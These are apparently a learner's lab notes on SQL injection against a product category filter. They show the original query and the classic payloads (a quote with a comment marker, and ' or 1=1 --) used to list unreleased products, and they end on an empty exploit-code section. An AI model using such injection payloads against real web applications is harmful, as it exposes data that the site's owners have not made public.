# Lab 1
## SQL METHOD
 1. SQL Injection - product category filter


 2. SELECT * FROM products WHERE category = 'Gifts' AND released = 1

 3. END GOAL : - display all products release and unreleased 

## Injection method  
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1

 ### 
    1. to break above query  i have to insert ' in category field 

    2. SELECT * FROM products WHERE category = ''--' AND released = 1

    3. SELECT * FROM products WHERE category = '' or 1=1 -- and released = 1


## Result 

    The above method break the sql query and show the all products

###
    Reason for the result of the above query is 
    it select all products without "and" statement so it display all products without filter


## Code for exploit
    '''python
    


